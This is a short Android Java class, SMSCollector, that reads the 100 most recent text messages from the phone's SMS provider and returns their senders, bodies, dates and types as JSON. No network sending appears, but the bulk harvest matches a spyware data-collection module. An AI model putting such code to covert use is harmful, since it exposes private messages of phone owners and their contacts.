package com.alzahra.data;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import org.json.JSONArray;
import org.json.JSONObject;

public class SMSCollector {
    private Context context;

    public SMSCollector(Context ctx) {
        this.context = ctx;
    }

    public JSONArray collectSMS() {
        JSONArray messages = new JSONArray();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(Uri.parse("content://sms/"), null, null, null, "date DESC LIMIT 100");
        
        if (cursor != null) {
            int addressIndex = cursor.getColumnIndex("address");
            int bodyIndex = cursor.getColumnIndex("body");
            int dateIndex = cursor.getColumnIndex("date");
            int typeIndex = cursor.getColumnIndex("type");
            
            while (cursor.moveToNext()) {
                try {
                    JSONObject msg = new JSONObject();
                    msg.put("address", cursor.getString(addressIndex));
                    msg.put("body", cursor.getString(bodyIndex));
                    msg.put("date", cursor.getLong(dateIndex));
                    msg.put("type", cursor.getInt(typeIndex));
                    messages.put(msg);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
        }
        return messages;
    }
}
